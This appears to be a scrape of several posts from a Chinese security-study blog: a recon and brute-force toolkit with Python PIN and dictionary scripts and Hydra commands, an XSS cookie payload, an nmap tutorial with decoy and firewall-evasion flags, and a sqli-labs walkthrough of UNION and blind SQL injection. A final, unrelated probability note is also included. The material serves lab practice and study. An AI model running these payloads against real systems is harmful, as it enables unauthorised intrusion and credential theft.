[{"content":"DNS侦察 DNSMAP DNS枚举并保存为txt DNSRecon A:IP MX:邮箱 NS:名称服务器 TXT:文本 ​ IP地址反向查询\nfierce 目标子域名和IP 主机枚举 ATK6 枚举主机，发现新设备，发起拒绝服务攻击，利用已知漏洞；检测内网中存活的IPv6主机\nhping3 发送ICMP请求，DDoS攻击，扫描主机端口，Fin扫描\nnmap 6种端口状态，\u0026ndash;spoof-mac -伪造nmap所在主机地址，-f分段处理加大目标主机上防火墙的拦截难度，-D RND指定生成数量的伪造的随机IP地址，\u0026ndash;data-string\u0026quot;\u0026ldquo;将自定义字符串（ASCII码）插入数据包\n指纹识别 wappalyzer火狐插件\nwhatweb 修改请求消息HTTP -H：Snowwolf -U：Chrome，识别CMS,博客平台，中间件，Web框架模块，网站服务器，脚本，IP，cookie\nWAF识别 防火墙 wafw00f \u0026ndash;proxy=代理地址\n目录扫描 dirb 需要登陆后的网站 -c “Cookie：\u0026hellip;.\u0026rdquo; 隐藏攻击者主机 -a dirbuster 图形化界面 gobuster ffuf -w指定字典文件 -u url Wfuzz web应用程序的模糊测试工具，发现Web应用程序的隐藏资源 -w字典文件 \u0026ndash;hc 404 url/FUZZ ​ 枚举php文件 FUZZ.php\n​ 使用Wfuzz枚举用户名和密码\n​ -f output.html保存为html文件在浏览器种打开\n漏洞数据库 searchsploit 可以与nmap联动 nmap url -sV -oX nmap.xml//-oX将扫描结果保存到一个XML文件中用于与searchsploit工具联动，输入searchsploit \u0026ndash;nmap nmap.xml 谷歌Hacking语法\n批量寻找网站后台 inurl：\nintext：\nintitle：\n指定网站寻找后台 site： inurl:/intext:/intitle:\n指定返回文件类型 filetype：\n批量寻找目录遍历漏洞 intext：index of/admin\nintext:index of\n暴力攻击 破解PIN码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import requests ip = \u0026#34;127.0.0.1\u0026#34; # Change this to your instance IP address port = 1234 # Change this to your instance port number # Try every possible 4-digit PIN (from 0000 to 9999) for pin in range(10000): formatted_pin = f\u0026#34;{pin:04d}\u0026#34; # Convert the number to a 4-digit string (e.g., 7 becomes \u0026#34;0007\u0026#34;) print(f\u0026#34;Attempted PIN: {formatted_pin}\u0026#34;) # Send the request to the server response = requests.get(f\u0026#34;http://{ip}:{port}/pin?pin={formatted_pin}\u0026#34;) # Check if the server responds with success and the flag is found if response.ok and \u0026#39;flag\u0026#39; in response.json(): # .ok means status code is 200 (success) print(f\u0026#34;Correct PIN found: {formatted_pin}\u0026#34;) print(f\u0026#34;Flag: {response.json()[\u0026#39;flag\u0026#39;]}\u0026#34;) break 运行\npython pin-solver.py\n字典攻击 字典攻击的有效性在于它能够利用人类倾向于优先选择容易记住的密码而不是安全的密码这一倾向。尽管屡次受到警告，但许多人仍然选择基于字典单词、常用短语、名称或容易猜测的模式等现成信息的密码。这种可预测性使他们容易受到字典攻击，攻击者会系统地针对目标系统测试预定义的潜在密码列表。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import requests ip = \u0026#34;127.0.0.1\u0026#34; # Change this to your instance IP address port = 1234 # Change this to your instance port number # Download a list of common passwords from the web and split it into lines passwords = requests.get(\u0026#34;https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt\u0026#34;).text.splitlines() # Try each password from the list for password in passwords: print(f\u0026#34;Attempted password: {password}\u0026#34;) # Send a POST request to the server with the password response = requests.post(f\u0026#34;http://{ip}:{port}/dictionary\u0026#34;, data={\u0026#39;password\u0026#39;: password}) # Check if the server responds with success and contains the \u0026#39;flag\u0026#39; if response.ok and \u0026#39;flag\u0026#39; in response.json(): print(f\u0026#34;Correct password found: {password}\u0026#34;) print(f\u0026#34;Flag: {response.json()[\u0026#39;flag\u0026#39;]}\u0026#34;) break 1 python3 dictionary-solver.py Hydra 为 Hydra 构建 params 字符串 Form Parameters：这些是保存用户名和密码的基本字段。Hydra 将动态地用单词列表中的值替换这些参数中的占位符（^USER^和）。^PASS^\nAdditional Fields：如果表单包含其他隐藏字段或令牌（例如 CSRF 令牌），则它们也必须包含在params字符串中。如果它们的值随每次请求而变化，则它们可以具有静态值或动态占位符。\nSuccess Condition：这定义了 Hydra 用来识别成功登录的标准。它可以是 HTTP 状态代码（例如S=302重定向）或服务器响应中特定文本的存在或不存在（例如F=Invalid credentials或S=Welcome）。\nHydra 命令的一般结构http-post-form如下：\n1 hydra [options] target http-post-form \u0026#34;path:params:condition_string\u0026#34; 1 hydra ... http-post-form \u0026#34;/login:user=^USER^\u0026amp;pass=^PASS^:F=Invalid credentials\u0026#34; 1 hydra ... http-post-form \u0026#34;/login:user=^USER^\u0026amp;pass=^PASS^:S=302\u0026#34; 我们将使用top-usernames-shortlist.txt作为用户名列表，使用2023-200_most_used_passwords.txt作为密码列表。\n例：\n1 hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt 94.237.63.74 -s 35392 http-post-form \u0026#34;/login:user=^USER^\u0026amp;pass=^PASS^:F=Invalid credentials\u0026#34; ","date":"2025-01-20T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90/","title":"脚本小子"},{"content":"Web应用程序 缺陷 真实场景 SQL 注入 获取 Active Directory 用户名并对 VPN 或电子邮件门户执行密码喷洒攻击。 文件包含 阅读源代码以查找隐藏的页面或目录，这些页面或目录公开了可用于获取远程代码执行的附加功能。 不受限制的文件上传 允许用户上传个人资料图片的 Web 应用程序，允许上传任何类型的文件（不仅仅是图片）。可以利用此功能通过上传恶意代码来完全控制 Web 应用程序服务器。 不安全的直接对象引用（IDOR） 当与访问控制失效等缺陷相结合时，这通常可用于访问其他用户的文件或功能。例如，在浏览到 /user/701/edit-profile 等页面时编辑您的用户个人资料。如果我们可以将 更改701为702，我们就可以编辑其他用户的个人资料！ 访问控制失效 另一个示例是允许用户注册新帐户的应用程序。如果帐户注册功能设计不佳，用户可能会在注册时执行权限提升。考虑POST注册新用户时的请求，该请求提交数据username=bjones\u0026amp;password=Welcome1\u0026amp;email=bjones@inlanefreight.local\u0026amp;roleid=3。如果我们可以操纵roleid参数并将其更改为0或会怎样1？我们已经看到了这种情况的真实应用程序，并且可以快速注册管理员用户并访问 Web 应用程序的许多非预期功能。 Web程序布局 层：\n类别 描述 Web Application Infrastructure 描述 Web 应用程序按预期运行所需的组件（如数据库）的结构。由于 Web 应用程序可以设置为在单独的服务器上运行，因此了解它需要访问哪个数据库服务器至关重要。 Web Application Components 组成 Web 应用程序的组件代表与 Web 应用程序交互的所有组件。这些组件分为以下三个区域：UI/UX、Client和Server组件。 Web Application Architecture 架构包括各个 Web 应用程序组件之间的所有关系。 Web 应用程序基础设施 Client-ServerWeb 应用程序通常采用该client-server模型。服务器以客户端-服务器模型托管 Web 应用程序，并将其分发给任何尝试访问它的客户端。在这种模型中，Web 应用程序有两种类型的组件：前端组件，通常在客户端（浏览器）上解释和执行；后端组件，通常由托管服务器编译、解释和执行。 One Server如果任何托管的 Web 应用程序存在漏洞，则整个 Web 服务器都会受到漏洞。 Many Servers - One Database此模型将数据库分离到其自己的数据库服务器上，并允许 Web 应用程序的托管服务器访问数据库服务器以存储和检索数据。只要数据库分离在其自己的数据库服务器上，就可以将其视为多服务器对一个数据库和单服务器对一个数据库。这种模型的主要优势 ( from a security point of view) 是分段，其中 Web 应用程序的每个主要组件都单独放置和托管。如果一个 Web 服务器受到攻击，其他 Web 服务器不会受到直接影响。 Many Servers - Many DatabasesWeb 应用程序只能访问私有数据和跨 Web 应用程序共享的公共数据。也可以将每个 Web 应用程序的数据库托管在其单独的数据库服务器上。这种设计还被广泛用于冗余目的，因此如果任何 Web 服务器或数据库脱机，备份将代替其运行，以尽可能减少停机时间。 Web应用程序组件 `Client\nServer\n网络服务器 Web 应用程序逻辑 数据库 Services\n（微服务）\n第三方集成 Web 应用程序集成 `Functions（无服务器）\n敏感数据泄露 敏感数据泄露是指最终用户可以以明文形式获取敏感数据ctrl + u`通过 Web 代理（如）键入或查看页面源代码Burp Suite\n有时，我们可能会发现登录名credentials、hashes或其他敏感数据隐藏在网页源代码的注释中或JavaScript正在导入的外部代码中。其他敏感信息可能包括暴露的链接或目录，甚至暴露的用户信息，所有这些都可能被利用来进一步访问 Web 应用程序或 Web 应用程序的支持基础设施\nHTML注入 HTML 注入是指未经过滤的用户输入显示在页面上。这可以通过检索之前提交的代码（例如从后端数据库检索用户评论）或直接在JavaScript前端显示未经过滤的用户输入来实现。\n1 \u0026lt;a href=\u0026#34;http://www.hackthebox.com\u0026#34;\u0026gt;Click Me\u0026lt;/a\u0026gt; 跨站点脚本XSS HTML Injection漏洞通常还可用于通过注入要在客户端执行的代码来执行跨站点脚本 (XSS)攻击。一旦我们可以在受害者的机器上执行代码，我们就有可能访问受害者的帐户甚至他们的机器。在实践中与非常相似。但是，涉及注入代码以在客户端执行更高级的攻击，而不仅仅是注入 HTML 代码。主要有三种类型：\n类型 描述 Reflected XSS 当用户输入经过处理（例如搜索结果或错误消息）显示在页面上时发生。 Stored XSS 当用户输入存储在后端数据库并在检索时显示（例如，帖子或评论）时发生。 DOM XSS 当用户输入直接显示在浏览器中并写入HTMLDOM 对象（例如，易受攻击的用户名或页面标题）时发生。 1 #\u0026#34;\u0026gt;\u0026lt;img src=/ onerror=alert(document.cookie)\u0026gt; 显示当前用户的cookie\n后端服务器 软件\nWeb Server Database Development Framework Combinations Components LAMP Linux, Apache, MySQL, and PHP. WAMP Windows, Apache, MySQL, and PHP. WINS Windows, IIS, .NET, and SQL Server MAMP macOS, Apache, MySQL, and PHP. XAMPP Cross-Platform, Apache, MySQL, and PHP/PERL. 组件\nCombinations Components LAMP Linux, Apache, MySQL, and PHP. WAMP Windows, Apache, MySQL, and PHP. WINS Windows, IIS, .NET, and SQL Server MAMP macOS, Apache, MySQL, and PHP. XAMPP Cross-Platform, Apache, MySQL, and PHP/PERL. 硬件\nHTTP响应代码：\n成功的响应 200 OK 请求已成功 重定向消息 301 Moved Permanently 请求资源的 URL 已永久更改 302 Found 请求资源的 URL 已临时更改 客户端错误响应 400 Bad Request 由于语法无效，服务器无法理解请求 401 Unauthorized 未经身份验证尝试访问页面 403 Forbidden 客户端无权访问内容 404 Not Found 服务器找不到请求的资源 405 Method Not Allowed 请求方法已被服务器所知，但已被禁用，无法使用 408 Request Timeout 某些服务器会在空闲连接上发送此响应，即使客户端之前没有任何请求 服务器错误响应 500 Internal Server Error 服务器遇到了不知道如何处理的情况 502 Bad Gateway 服务器在作为网关获取处理请求所需的响应时，收到了无效响应 504 Gateway Timeout 服务器作为网关，无法及时得到响应 端口有两种类型：传输控制协议 (TCP)和用户数据报协议 (UDP) Port(s) Protocol 20/21 (TCP) FTP 22 (TCP) SSH 23 (TCP) Telnet 25 (TCP) SMTP 80 (TCP) HTTP 161 (TCP/UDP) SNMP 389 (TCP/UDP) LDAP 443 (TCP) SSL/TLS (HTTPS) 445 (TCP) SMB 3389 (TCP) RDP shell连接 shell类型 描述 Reverse shell 启动与攻击箱上的“监听器”的连接。 Bind shell “绑定”到目标主机上的特定端口并等待来自我们的攻击箱的连接。 Web shell 通过 Web 浏览器运行操作系统命令，通常不是交互式或半交互式的。它还可用于运行单个命令（即利用文件上传漏洞并上传PHP脚本来运行单个命令）。 渗透测试流程 tmux tmux new -s \u0026lt;名称\u0026gt;\n执行命令 ctrl+b+ d\n重新连接tmux attach -t \u0026lt;名称\u0026gt;\ntmux ls展示所有会话\nnmap 例：nmap 10.129.42.253\n运行 Nmap 脚本的语法是`nmap \u0026ndash;script ","date":"2025-01-14T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/","title":"Web应用程序"},{"content":" TCP扫描，默认常用 1 sudo nmap -sS localhost 发现主机 1 sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d\u0026#34; \u0026#34; -f5 扫描选项 描述 10.129.2.0/24 目标网络范围。 -sn 禁用端口扫描。 -oA tnet 以名称“tnet”开头的所有格式存储结果。 Firewall and IDS Evasion此扫描方法仅在主机的防火墙允许的情况下才有效\n禁用端口扫描，则会启用ICMP扫描\n扫描IP列表 1 cat hosts.lst 这可能意味着其他主机由于其防火墙配置而忽略了默认的ICMP 回应请求Nmap。由于没有收到响应，它会将这些主机标记为非活动状态\n对预定义列表使用相同的扫描技术\n1 sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d\u0026#34; \u0026#34; -f5 扫描选项 描述 -sn 禁用端口扫描。 -oA tnet 以名称“tnet”开头的所有格式存储结果。 -iL 对提供的“hosts.lst”列表中的目标执行定义的扫描。 为了确保发送了 ICMP 回显请求，\nICMP 回显请求 ( -Pn)、DNS 解析 ( -n) 和 ARP ping 扫描 ( --disable-arp-ping)。 1 sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d\u0026#34; \u0026#34; -f5 1 sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace 扫描选项 描述 10.129.2.18 对目标执行定义的扫描。 -sn 禁用端口扫描。 -oA host 以名称“host”开头的所有格式存储结果。 -PE 使用“ICMP Echo 请求”对目标执行 ping 扫描。 --packet-trace 显示所有发送和接收的数据包 1 sudo nmap 10.129.2.18 -sn -oA host -PE --reason 扫描选项 描述 10.129.2.18 对目标执行定义的扫描。 -sn 禁用端口扫描。 -oA host 以名称“host”开头的所有格式存储结果。 -PE 使用“ICMP Echo 请求”对目标执行 ping 扫描。 --reason 显示特定结果的原因。 主机和端口扫描 在发现目标还活着之后，我们希望更准确地了解系统。我们需要的信息包括：\n开放端口及其服务 服务版本 服务提供的信息 操作系统 扫描端口六种情况：\n状态 描述 open 这表示已建立与扫描端口的连接。这些连接可以是TCP 连接、UDP 数据报以及SCTP 关联。 closed 当端口显示为关闭时，TCP 协议会指示我们收到的数据包包含一个RST标志。这种扫描方法还可用于确定我们的目标是否还活着。 filtered Nmap 无法正确识别扫描的端口是打开还是关闭，因为目标没有返回该端口的响应，或者我们从目标收到错误代码。 unfiltered 端口的这种状态仅在TCP-ACK扫描期间发生，表示该端口可访问，但无法确定它是开放还是关闭。 `open filtered` `closed filtered` 扫描前 10 个 TCP 端口 1 sudo nmap 10.129.2.28 --top-ports=10 扫描选项 描述 10.129.2.28 扫描指定目标。 --top-ports=10 扫描已被定义为最频繁的指定顶级端口。 Nmap——跟踪数据包 1 sudo nmap 10.129.2.28 -p 21 --packet-trace -Pn -n --disable-arp-ping 扫描选项 描述 10.129.2.28 扫描指定目标。 -p 21 仅扫描指定端口。 --packet-trace 显示所有发送和接收的数据包。 -n 禁用 DNS 解析。 --disable-arp-ping 禁用 ARP ping。 信息 描述 SENT (0.0429s) 表示Nmap的SENT操作，向目标发送数据包。 TCP 显示用于与目标端口交互的协议。 10.10.14.2:63090 \u0026gt; 代表我们的 IPv4 地址和源端口，Nmap 将使用它们来发送数据包。 10.129.2.28:21 显示目标 IPv4 地址和目标端口。 S 发送的TCP数据包的SYN标志。 ttl=56 id=57322 iplen=44 seq=1699105818 win=1024 mss 1460 附加的 TCP 标头参数。 连接扫描 Nmap TCP 连接扫描( -sT) 使用 TCP 三次握手来确定目标主机上的特定端口是打开还是关闭。\n1 sudo nmap 10.129.2.28 -p 443 --packet-trace --disable-arp-ping -Pn -n --reason -sT 该Connect扫描（也称为完整 TCP 连接扫描）非常准确，因为它完成了三次 TCP 握手，使我们能够确定端口的确切状态（打开、关闭或过滤）。但是，它并不是最隐蔽的。\n过滤端口 防火墙drops会扫描我们发送的 TCP 数据包。因此，我们扫描 TCP 端口139，该端口已显示为已过滤。为了能够跟踪我们发送的数据包的处理方式，我们再次停用 ICMP 回显请求 ( -Pn)、DNS 解析 ( -n) 和 ARP ping 扫描 ( --disable-arp-ping)。\n1 sudo nmap 10.129.2.28 -p 139 --packet-trace -n --disable-arp-ping -Pn 发现开放的 UDP 端口 1 sudo nmap 10.129.2.28 -F -sU 扫描选项 描述 10.129.2.28 扫描指定目标。 -F 扫描前 100 个端口。 -sU 执行 UDP 扫描。 一些系统管理员有时会忘记过滤除 TCP 端口之外的 UDP 端口，但UDP比TCP慢的多\n这样做的另一个缺点是，我们经常得不到响应，因为Nmap向扫描的 UDP 端口发送空数据报，并且我们没有收到任何响应。所以我们无法确定 UDP 数据包是否已经到达。如果 UDP 端口为open，则只有在应用程序配置为这样做的情况下，我们才会收到响应。\n版本扫描 1 sudo nmap 10.129.2.28 -Pn -n --disable-arp-ping --packet-trace -p 445 --reason -sV 扫描选项 描述 10.129.2.28 扫描指定目标。 -Pn 禁用 ICMP Echo 请求。 -n 禁用 DNS 解析。 --disable-arp-ping 禁用 ARP ping。 --packet-trace 显示所有发送和接收的数据包。 -p 445 仅扫描指定端口。 --reason 显示端口处于特定状态的原因。 -sV 执行服务扫描。 扫描端口的另一种方便方法是-sV使用选项从开放端口获取其他可用信息。此方法可以识别版本、服务名称和有关目标的详细信息。\n保存结果 Nmap可以以 3 种不同的格式保存结果。\n正常输出（-oN）.nmap文件扩展名 带有文件扩展名的Grepable 输出（-oG）.gnmap XML 输出 ( -oX)，.xml文件扩展名 我们还可以指定选项（-oA）以所有格式保存结果。命令可能如下所示：\n1 sudo nmap 10.129.2.28 -p- -oA target 扫描选项 描述 10.129.2.28 扫描指定目标。 -p- 扫描所有端口。 -oA target 以所有格式保存结果，每个文件的名称以“目标”开头。 1 target.gnmap target.xml target.nmap 转换格式 要将存储的结果从 XML 格式转换为 HTML，我们可以使用该工具xsltproc。\n1 xsltproc target.xml -o target.html 服务枚举 服务版本检测 1 sudo nmap 10.129.2.28 -p- -sV 描选项 描述 10.129.2.28 扫描指定目标。 -p- 扫描所有端口。 -sV 对指定端口执行服务版本检测。 增加verbosity level（-v/ -vv），当检测到开放端口时，它将直接显示给我们Nmap\n1 sudo nmap 10.129.2.28 -p- -sV -v 扫描选项 描述 10.129.2.28 扫描指定目标。 -p- 扫描所有端口。 -sV 对指定端口执行服务版本检测。 -v 增加扫描的详细程度，以显示更详细的信息。 横幅抓取 Nmap则尝试通过基于签名的匹配系统识别它们，但这会大大增加扫描的持续时间。Nmap所呈现结果的一个缺点是自动扫描可能会遗漏一些信息，因为有时Nmap不知道如何处理它。\n某些服务可能不会立即提供此类信息。也可以从相应的服务中删除或操纵横幅。如果我们manually使用 连接到 SMTP 服务器nc，抓取横幅，并使用 拦截网络流量tcpdump，我们就可以看到Nmap未显示的内容。\n传输控制包Tcpdump 1 sudo tcpdump -i eth0 host 10.10.14.2 and 10.129.2.28 nc 1 nc -nv 10.129.2.28 25 Nmap脚本引擎 它为我们提供了在 Lua 中创建脚本以与某些服务进行交互的可能性。这些脚本总共可分为 14 个类别：\n类别 描述 auth 确定身份验证凭证。 broadcast 通过广播来发现主机的脚本以及发现的主机可以自动添加到剩余的扫描中。 brute 执行脚本，尝试通过使用凭证进行暴力破解来登录相应的服务。 default 使用该-sC选项执行的默认脚本。 discovery 无障碍服务的评估。 dos 这些脚本用于检查服务是否存在拒绝服务漏洞，由于它会损害服务，因此使用较少。 exploit 此类脚本尝试利用扫描端口的已知漏洞。 external 使用外部服务进行进一步处理的脚本。 fuzzer 这使用脚本通过发送不同的字段来识别漏洞和意外的数据包处理，这可能需要很长时间。 intrusive 可能对目标系统产生负面影响的侵入性脚本。 malware 检查某些恶意软件是否感染了目标系统。 safe 不执行侵入性和破坏性访问的防御脚本。 version 服务检测的扩展。 vuln 识别特定的漏洞。 默认脚本 -sC\n特定脚本类型\u0026ndash;script 定义脚本 \u0026ndash;script ,\nNmap - Aggressive Scan -A 1 sudo nmap 10.129.2.28 -p 80 -A -A 执行服务检测、操作系统检测、跟踪路由并使用默认脚本扫描目标。 发现了系统上运行着哪种 Web 服务器,使用了哪种 Web 应用程序，以及网页的标题 。 漏洞评估 --script vuln 使用指定类别的所有相关脚本。 防火墙和IDS/IPS规避 TCP SYN扫描又称“半开扫描”。回顾TCP连接的三次握手，申请方首先发送的是一个SYN数据包，服务方在接到这个SYN数据包后，如果该端口处于侦听状态，则会回复一个SYN|ACK的数据包；如果该端口没有处于侦听状态，则会回复一个RST的数据包。而此时如果对方处于侦听状态，申请方还需要再向对方回复一个ACK数据包以示建立连接。此时对方就认为连接建立，并记入日志。\n无论服务方回复SYN|ACK的数据包，还是回复RST的数据包，申请方其实已经能够判断对方端口是否为“开”的状态。之后的ACK数据包发送则被对方监视，如果此时不发送ACK数据包，而是发一个RST数据包，则不仅关闭了这个未完成的连接过程，并且也会因为连接未建立而不会被对方记录。这种扫描方式因为使用了SYN标志位，所以被称为TCP SYN扫描。这种扫描技术的优点在于一般不会在目标计算机上留下记录，有时即使在用netstat命令也显示不出来；但这种方法的一个缺点是必须要有管理员权限才能建立自己的SYN数据包。\n使用诱饵扫描 Nmap 会生成插入到 IP 标头中的各种随机 IP 地址，以掩盖发送的数据包的来源。使用此方法，我们可以随机生成 ( RND) 个特定数量（例如：5）的 IP 地址，并以冒号 ( :) 分隔。然后，我们的真实 IP 地址会随机放置在生成的 IP 地址之间\n1 sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5 扫描选项 描述 10.129.2.28 扫描指定目标。 -p 80 仅扫描指定端口。 -sS 对指定端口执行 SYN 扫描。 -Pn 禁用 ICMP Echo 请求。 -n 禁用 DNS 解析。 --disable-arp-ping 禁用 ARP ping。 --packet-trace 显示所有发送和接收的数据包。 -D RND:5 生成五个随机 IP 地址，指示连接来自的源 IP。 DNS 代理 过滤端口的 SYN 扫描 1 sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace 从 DNS 端口进行 SYN 扫描 1 sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53 现在我们已经发现防火墙接受了TCP port 53，因此很可能 IDS/IPS 过滤器的配置也比其他过滤器弱得多。我们可以通过使用 尝试连接到此端口来测试这一点Netcat。\n扫描选项 描述 10.129.2.28 扫描指定目标。 -p 50000 仅扫描指定端口。 -sS 对指定端口执行 SYN 扫描。 -Pn 禁用 ICMP Echo 请求。 -n 禁用 DNS 解析。 --disable-arp-ping 禁用 ARP ping。 --packet-trace 显示所有发送和接收的数据包。 --source-port 53 从指定的源端口执行扫描。 连接到过滤端口 1 ncat -nv --source-port 53 10.129.2.28 50000 ","date":"2025-01-12T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/nmap%E5%9F%BA%E7%A1%80/","title":"nmap基础"},{"content":" 工具：phpstudy，Hackbar 搭建靶场：sqli-labs(从Github上下载官方的，有些民间的可能会有木马) 数据库：mysql5.7 联合注入 需要页面有回显位\n查找注入点\n判断使字符型还是数字型注入id=2-1\n如果是字符型，找到闭合方式，‘，“，’)\n判断查询列数，order by\n查询回显位置，同时将原先的查询id注释掉\n拿到表名和列名：数据库（information_schema），表名集合表（tables），列名集合表（columns）用group_concat()确保所有查询信息能放到一行显示出来\nless-1 判断是否存在sql注入\n\u0026ndash;+表示对多余的引号进行注释，因为是字符型，数字型就不用管\n1 ?id=1\u0026#39; order by 3--+ 显示正常\n1 ?id=1\u0026#39; order by 4--+ 报错\n得知less-1共有三列，爆出显示位\n1 ?id=1\u0026#39; union select 1,2,3--+ 在mysql里面尝试union select\n1 ?id=-1\u0026#39; union select 1,2,3--+ 使id=-1报错注释，页面显示正常\n获取数据名\n1 ?id=-1\u0026#39; union select 1,database(),version() --+ 中间省略了一些过程详见less-2\n查询用户名和密码\n1 ?id=-1\u0026#39; union select 1,group_concat(username,\u0026#39;~\u0026#39;,password),3 from users--+ less-2 判断为数字型，页面改变\n1 ?id=2-1 ？id=2 三列\n1 ?id=1 order by 3 闭合方式为‘\n1 ?id=1\u0026#39; order by 3 爆数据名\n1 ？id=-1 union select 1,database(),version() 爆表名\n1 ?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39; 爆列名\n1 ?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=\u0026#39;security\u0026#39; less-3 与前两关不同的地方是闭合方式\n1 ?id=1\u0026#39; 单引号加括号，后续一律以?id=1\u0026rsquo;)开头，和上面同\nless-4 判断得知闭合方式双引号加括号\n1 /?id=2\u0026#34; 布尔盲注 页面没有回显，只适用于Mysql，本质就是猜数字游戏，ASCII码判断用二分法，对于字符长度判断可以直接猜大小\n判断得知闭合方式为'\n二分法判断数据库长度 1 2 3 4 ?id=1\u0026#39; and length(database())\u0026gt;10--+ //不显示 ?id=1\u0026#39; and length(database())\u0026gt;5--+ //正常显示 ?id=1\u0026#39; and length(database())\u0026gt;7--+ //正常显示 ?id=1\u0026#39; and length(database())\u0026gt;8--+ //不显示 得知database（）长度为8\n二分法利用ASCII码判断字符 1 2 3 4 ?id=1\u0026#39; and ascii(substr(database(),1,1))\u0026gt;100--+ //正常显示 ?id=1\u0026#39; and ascii(substr(database(),1,1))\u0026gt;114--+ //正常显示 ?id=1\u0026#39; and ascii(substr(database(),1,1))\u0026gt;120--+ //不显示 ?id=1\u0026#39; and ascii(substr(database(),1,1))\u0026gt;115--+ //不显示 得知第一个字符ASCII码为115，即“s”\n依次判断8个字符，知当前数据库为security\n判断当前数据库的表 判断是否存在admin表\n1 ?id=1\u0026#39; and exists(select * from admin)--+ 判断表的个数 1 2 ?id=1\u0026#39; and (select count(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39;)\u0026gt;4--+ //正常显示 ?id=1\u0026#39; and (select count(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39;)\u0026gt;3--+ //不显示 逐一判断表名字符长度 1 ?id=1\u0026#39; and length((select table_name from information_schema.tables where table_schema=\u0026#39;security\u0026#39; limit 0,1))=6--+ 逐一判断表名字符的ASCII码 1 ?id=1\u0026#39; and ascii(substr((select table_name from information_schema.tables where table_schema=\u0026#39;security\u0026#39; limit 0,1),1,1))\u0026gt;100--+ 存在emails,referers,uagents,users\n对column执行相同的操作，where语句修改 1 where table_name = \u0026#39;users\u0026#39; //以及uagents,referers,emails.......一个一个判断，虽然这个过程真的十分漫长 得知users中有三个字段id,username,password\n判断字段长度 1 ?id=1\u0026#39; and length((select id from users limit 3,1))=1--+ 判断字段ASCII值 1 ?id=1\u0026#39; and ascii(substr((select id from users limit 3,1)),1,1)\u0026gt;100--+ ","date":"2025-01-05T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/sqli-labs%E9%80%9A%E5%85%B3/","title":"sqli-labs通关"},{"content":"记号\n$$\\binom n{n_1,n_2,\\cdots,n_r}=\\frac{n!}{n_1!n_2!\\cdots n_r!}$$因此，$\\binom n{n_1,n_2,\\ldots,n_r}$表示把 $n$ 个 不 同 的 元 素 分 成 大 小 分 别 为 $n_1, n_2, \\ldots , n_r$的$r$个\n不同组的组合数. 例 5e 假设有$n+m$个球，其中$n$个红的，$m$个蓝的，将它们随机排成一排，即所$(n+m)!$种排列都是等可能的. 如果只记录连续排列的球的颜色，证明各种可能的结果概率是一样的. 解 我们将$(n+m$)个球的次序排列称为一组球的排列，将 $n+m$ 个球的颜色次序排称为一组球的颜色次序排列. 球的排列共有($n+m$)!种，在红球之间作任何一个位于换，在蓝球之间作任何一个位置置换，置换的结果并不影响球的颜色次序排列. 从而组球的颜色次序排列，对应于$n!m!$个球的排列，这说明球的次序排列也是等可能的且每一种颜色次序出现的概率为$n!m!/(n+m)!.$\n多项式定理\n$$(x_{1}+x_{2}+\\cdots+x_{r})^{n}=\\sum_{\\begin{array}{c}(n_{1},\\cdots,n_{r}):\\\\n_{1}+\\cdots+n_{r}=n\\end{array}}\\binom{n}{n_{1},n_{2},\\cdots,n_{r}}x_{1}^{n_{1}}x_{2}^{n_{2}}\\cdots x_{r}^{n_{r}}$$上式的求和号是对满足 $n_1+n_2+\\cdotp\\cdotp\\cdotp\\cdotp+n_r=n$ 的所有非负整数向量($n_1,n_2,\\cdotp\\cdotp\\cdotp,n_r)$求和.\n命题 6.1 共有$\\binom{n-1}{r-1}$个不同的正整数向量$(x_1,x_2,\\cdots,x_r)$满足 为了得到非负整数解(而不是正整数解)的个数，注意，$x_1+x_2+\\cdots+x_r=n$的非负整数解个数与$y_1+y_2+\\cdotp\\cdotp\\cdotp+y_r=n+r$的正整数解个数是相同的(令$y_i= x_i+ 1$, $i= 1$, $\\cdots$, $r) .$ 因此，利用命题 6.1,可得到如下命题。\n生日问题 如果房间里有$n$个人，那么没有两人的生日是同一天的概率是多大？当$n$多大 时，才能保证此概率小于1/2? 解 每个人的生日都有 365 种可能，所以$n$个人一共是 365\u0026quot; 种可能(此处忽略有人生日是 2月 29 日的可能性). 假定每种结果的可能性都是一样的，那么所求事件的概率为$365\\times364\\times363\\times\\cdots\\times(365-n+1)/365^n.$令人惊奇的是，一旦$n\\geqslant23$,这个概率就比1/2要小. 即房间里人数如果超过 23 的话，那么至少有两人为同一天生日的概率就大于 1/2. 很多人一开始对这个结果很吃惊，因为 23 相对于一年 365 天来说太小了.然而，对每两个人来说，生日相同的概率为$\\frac{365\\cdot\\tilde{}}{(365)^2}=\\frac1{365}$,23个人一共可以组成$\\binom{23}2=253$ 对，这样来看上述结果似乎就不再令人吃惊了.\n配对问题 假设有 N 位男士参加舞会，所有人都将帽子扔到房间中央混在一 起，然后每人再随机拿一顶帽子.所有人都没有拿到自己帽子的概率是多少？ 解 先计算至少有一人拿到自己的帽子的概率.令$E_i(i=1,2,\u0026hellip;,N)$表示事件“第$i$ 人拿到了自己的帽子”.这样，由命题 